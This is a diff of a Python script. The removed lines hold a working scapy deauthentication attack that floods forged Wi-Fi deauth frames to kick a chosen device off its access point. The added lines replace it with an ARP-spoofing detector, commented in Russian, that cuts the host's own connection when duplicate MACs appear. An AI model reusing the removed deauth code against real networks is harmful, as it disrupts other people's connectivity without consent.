@@ -1,49 +1,58 @@
-import scapy.all as scapy
-
-def disconnect_user(mac_address, access_point,interface): 
-    packet = scapy.RadioTap() / scapy.Dot11(addr1=mac_address, 
-                                addr2=access_point, 
-            addr3=access_point) / scapy.Dot11Deauth(reason = 7) 
-    scapy.sendp(packet, inter=0.01, 
-        count=100, iface=interface, 
-        verbose=1) 
-
-
-def get_mac_address(ip_address): 
-    arp_request = scapy.ARP(pdst=ip_address) 
-    arp_response = scapy.sr1(arp_request, 
-                    timeout=1, verbose=False) 
-    if arp_response is not None: 
-        return arp_response.hwsrc 
+import subprocess 
+import os 
+import platform 
+import time 
+ 
+def get_arp_table(): 
+    try: 
+        if platform.system() == "Windows": 
+            command = "ARP -a -N 192.168.184.199" 
+        else: 
+            command = "ip neigh"  # Альтернатива для Linux 
+        output = subprocess.check_output(command, shell=True) 
+        return output.decode('latin-1').splitlines()  # Изменено на 'latin-1' 
+    except subprocess.CalledProcessError as e: 
+        print(f"Ошибка при выполнении команды: {e}") 
+        return [] 
+ 
+def check_duplicates(arp_table): 
+    mac_dict = {} 
+    for line in arp_table: 
+        parts = line.split() 
+        if len(parts) >= 3:  # Убедимся, что строка содержит нужные данные 
+            ip_address = parts[0] 
+            mac_address = parts[1] if platform.system() == "Windows" else parts[5]  # Для 'ip neigh' 
+             
+            # Приводим MAC-адрес к нижнему регистру и убираем разделители для сравнения 
+            mac_address_cleaned = mac_address.lower().replace('-', ':') 
+             
+            # Исключаем MAC-адрес ff:ff:ff:ff:ff:ff 
+            if mac_address_cleaned == 'ff:ff:ff:ff:ff:ff': 
+                continue 
+             
+            if mac_address_cleaned in mac_dict: 
+                mac_dict[mac_address_cleaned].append(ip_address) 
+            else: 
+                mac_dict[mac_address_cleaned] = [ip_address] 
+ 
+    return {mac: ips for mac, ips in mac_dict.items() if len(ips) > 1} 
+ 
+def disable_internet(): 
+    try: 
+        if platform.system() == "Windows": 
+            os.system("ipconfig /release") 
+        else: 
+            os.system("sudo ip link set dev <интерфейс> down")  # Замените <интерфейс> на нужный 
+    except Exception as e: 
+        print(f"Ошибка при отключении интернета: {e}") 
+ 
+while True: 
+    arp_table = get_arp_table() 
+    duplicates = check_duplicates(arp_table) 
+    if duplicates: 
+        print("Найден дубликат MAC-адреса:", duplicates) 
+        disable_internet() 
     else: 
-        return None
-    
-def getting_ip_of_access_point(): 
-    return scapy.conf.route.route("8.8.8.8")[2] 
-
-def getting_ip_of_this_device(): 
-    return scapy.conf.route.route("8.8.8.8")[1] 
-
-def getting_interface(ipaddress): 
-    for interface in scapy.ifaces.values(): 
-        if interface.ip == ipaddress: 
-            return {"name":interface.name, 
-                    "mac":interface.mac} 
-
-    
-if __name__ == '__main__': 
-
-    devce_ip = '192.168.31.140'
-    router_ip = getting_ip_of_access_point() 
-    interface = getting_interface(getting_ip_of_this_device()) 
-    mac_address_access_point = get_mac_address(router_ip) 
-    mac_address_device = get_mac_address(devce_ip) 
-    
-    print("MAC Address of Access Point : ", 
-        mac_address_access_point) 
-    print("MAC Address of Device : ", 
-        mac_address_device) 
-    print("Starting Deauthentication Attack on Device : ", 
-        mac_address_device) 
-    disconnect_user(mac_address_device, 
-        mac_address_access_point,interface['name']) 
+        print("Дубликатов не найдено.") 
+     
+    time.sleep(10)  # Задержка в 10 секунд перед следующей проверкой
